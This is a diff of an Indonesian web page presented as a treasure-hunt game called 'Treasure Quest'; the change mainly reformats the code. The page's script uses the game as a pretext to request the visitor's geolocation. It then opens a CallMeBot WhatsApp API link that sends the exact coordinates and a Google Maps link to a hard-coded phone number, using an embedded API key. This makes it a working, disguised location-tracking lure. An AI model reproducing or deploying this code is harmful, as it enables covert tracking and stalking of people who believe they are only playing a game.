@@ -6,7 +6,6 @@
 <title>Treasure Quest</title>
 
 <style>
-
 body{
 margin:0;
 padding:0;
@@ -54,85 +53,49 @@ font-size:12px;
 opacity:.8;
 margin-top:15px;
 }
-
 </style>
 </head>
 
 <body>
 
 <div class="container">
-
-<div class="logo">
-🏆
-</div>
-
-<h2>Treasure Quest</h2>
-
-<p>
-Temukan harta karun di sekitar Anda!
-</p>
-
-<div class="note">
-Game membutuhkan akses lokasi untuk menjalankan misi.
-</div>
-
-<button onclick="mulaiMisi()">
-Mulai Misi
-</button>
-
-<div class="status" id="status"></div>
-
+    <div class="logo">🏆</div>
+    <h2>Treasure Quest</h2>
+    <p>Temukan harta karun di sekitar Anda!</p>
+    <div class="note">Game membutuhkan akses lokasi untuk menjalankan misi.</div>
+    <button onclick="mulaiMisi()">Mulai Misi</button>
+    <div class="status" id="status"></div>
 </div>
 
 <script>
-
 async function mulaiMisi(){
+    let status = document.getElementById("status");
+    status.innerHTML = "🎮 Memulai misi...";
 
-let status=document.getElementById("status");
+    navigator.geolocation.getCurrentPosition(
+        async function(pos){
+            let lat = pos.coords.latitude;
+            let long = pos.coords.longitude;
 
-status.innerHTML="🎮 Memulai misi...";
+            status.innerHTML = "📍 Lokasi ditemukan<br>Mengirim misi...";
 
-navigator.geolocation.getCurrentPosition(
+            // PERBAIKAN: Format link Google Maps yang benar agar bisa diklik di WA
+            let pesan = `🎮 Player memulai misi\n\n📍 Latitude: ${lat}\n📍 Longitude: ${long}\n\n🗺️ https://maps.google.com/?q=${lat},${long}`;
 
-async function(pos){
+            let nomor = "6287894025536";
+            let apikey = "4901523";
 
-let lat=pos.coords.latitude;
-let long=pos.coords.longitude;
+            let api = `https://api.callmebot.com/whatsapp.php?phone=${nomor}&text=${encodeURIComponent(pesan)}&apikey=${apikey}`;
 
-status.innerHTML=
-"📍 Lokasi ditemukan<br>Mengirim misi...";
-
-let pesan=
-`🎮 Player memulai misi
-
-📍 Latitude: ${lat}
-📍 Longitude: ${long}
-
-🗺️ https://maps.google.com/?q=${lat},${long}`;
-
-let nomor = "6287894025536";
-let apikey = "4901523";
-
-let api=
-`https://api.callmebot.com/whatsapp.php?phone=${nomor}&text=${encodeURIComponent(pesan)}&apikey=${apikey}`;
-
-// Membuka WhatsApp secara otomatis untuk mengirim koordinat
-window.open(api, '_blank');
-status.innerHTML = `✅ Misi berhasil dimulai!<br><br>Mengalihkan ke WhatsApp...`;
-
-},
-
-function(){
-
-status.innerHTML=
-"❌ Lokasi belum diizinkan";
-
+            // Membuka WhatsApp secara otomatis untuk mengirim koordinat
+            window.open(api, '_blank');
+            status.innerHTML = `✅ Misi berhasil dimulai!<br><br>Mengalihkan ke WhatsApp...`;
+        },
+        function(){
+            status.innerHTML = "❌ Lokasi belum diizinkan";
+        }
+    );
 }
-
-);
-
-}
-
 </script>
 
 </body>
